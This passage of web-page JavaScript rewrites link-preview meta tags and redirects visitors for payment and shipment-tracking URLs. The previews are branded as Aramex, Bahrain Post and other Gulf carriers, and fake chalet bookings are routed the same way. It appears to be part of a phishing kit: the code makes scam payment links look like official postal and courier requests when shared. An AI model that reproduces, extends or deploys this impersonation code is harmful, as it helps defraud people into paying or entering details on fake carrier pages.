        nameEn: "Bahrain Post",
        description: "المشغل الوطني للبريد في مملكة البحرين - نظام دفع آمن ومحمي",
        descriptionEn: "National postal operator in Bahrain - Secure and protected payment system",
        ogImage: "/og-bahpost.jpg"

    // Country data mapping
    const countryData = {
      AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
      SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
      KW: { nameAr: "دولة الكويت", name: "Kuwait" },
      QA: { nameAr: "دولة قطر", name: "Qatar" },
      OM: { nameAr: "سلطنة عُمان", name: "Oman" },
      BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
    };

    function updateMetaTags() {
      const url = new URL(window.location.href);
      const path = url.pathname;
      const siteUrl = `${url.protocol}//${url.host}`;
      let targetUrl = '/';

      // Check if this is a payment link: /pay/:companyId
      const payMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)$/);
      if (payMatch) {
        const companyId = payMatch[1];
        const serviceInfo = serviceData[companyId] || serviceData.aramex;

        const title = `إتمام الدفع - ${serviceInfo.name}`;
        const description = serviceInfo.description;
        const ogImage = `${siteUrl}${serviceInfo.ogImage}`;

        updateTags(title, description, ogImage, url.href);
        targetUrl = `/pay/${companyId}.html`;
        setTimeout(() => window.location.href = targetUrl, 1000);
        return;
      }

      // Check if this is a tracking link: /r/:companyId
      const rMatch = path.match(/^\/r\/([a-zA-Z0-9-]+)$/);
      if (rMatch) {
        const companyId = rMatch[1];
        const serviceInfo = serviceData[companyId] || serviceData.aramex;

        const title = `تتبع الشحنة - ${serviceInfo.name}`;
        const description = serviceInfo.description;
        const ogImage = `${siteUrl}${serviceInfo.ogImage}`;

        updateTags(title, description, ogImage, url.href);
        targetUrl = `/r/${companyId}.html`;
        setTimeout(() => window.location.href = targetUrl, 1000);
        return;
      }

      // Check if this is a microsite route: /r/:country/:type/:id
      const micrositeMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);

      if (micrositeMatch) {
        const [, countryCode, type, id] = micrositeMatch;
        const country = countryData[countryCode];

        if (!country) {
          window.location.href = '/';
          return;
        }

        let title = "";
        let description = "";
        let ogImage = "/og-aramex.jpg";

        if (type === "shipping") {
          // For shipping, try to get service info from URL parameters or use default
          const serviceKey = url.searchParams.get('service') || 'aramex';
          const serviceInfo = serviceData[serviceKey] || serviceData.aramex;

          // Ensure serviceInfo and its properties exist
          if (serviceInfo && serviceInfo.name && serviceInfo.description && serviceInfo.ogImage) {
            title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
            description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
            ogImage = serviceInfo.ogImage;
          } else {
            // Use default values if serviceInfo is invalid
            title = "تتبع وتأكيد الدفع - منصة الشحن الذكية";
            description = "تتبع شحنتك وأكمل الدفع بشكل آمن عبر منصة الشحن الذكية";
            ogImage = "/og-aramex.jpg";
          }
        } else if (type === "chalet") {
          // For chalet links
          title = `حجز شاليه في ${country.nameAr || country.name}`;
          description = `احجز شاليه أحلامك في ${country.nameAr || country.name} - نظام دفع آمن ومحمي`;
          ogImage = "/og-aramex.jpg";
        }

        const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
        updateTags(title, description, fullOgImage, url.href);
        targetUrl = url.href;
        setTimeout(() => window.location.href = targetUrl, 1000);
        return;
      }

      // Not a recognized route, redirect to main app
      window.location.href = '/';
    }

    function updateTags(title, description, ogImage, fullUrl) {
      // Helper function to safely update elements
      function safeUpdateElement(id, property, value, defaultValue) {
        const element = document.getElementById(id);
        if (element && value !== undefined && value !== null) {
          if (property === 'textContent') {
            element.textContent = value;
          } else {
            element.setAttribute(property, value || defaultValue);
          }
        }
      }

      // Update meta tags with fallbacks
      safeUpdateElement('page-title', 'textContent', title, "منصة الشحن الذكية");
      safeUpdateElement('page-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
      safeUpdateElement('og-url', 'content', fullUrl, "");
      safeUpdateElement('og-title', 'content', title, "منصة الشحن الذكية");
      safeUpdateElement('og-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
      safeUpdateElement('og-image', 'content', ogImage, `${new URL(window.location.href).origin}/og-aramex.jpg`);
      safeUpdateElement('twitter-url', 'content', fullUrl, "");
      safeUpdateElement('twitter-title', 'content', title, "منصة الشحن الذكية");
      safeUpdateElement('twitter-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
      safeUpdateElement('twitter-image', 'content', ogImage, `${new URL(window.location.href).origin}/og-aramex.jpg`);
      safeUpdateElement('twitter-image-alt', 'content', title, "منصة الشحن الذكية");
      safeUpdateElement('canonical-url', 'href', fullUrl, "");
    }

    // Run on page load
    updateMetaTags();
  </script>
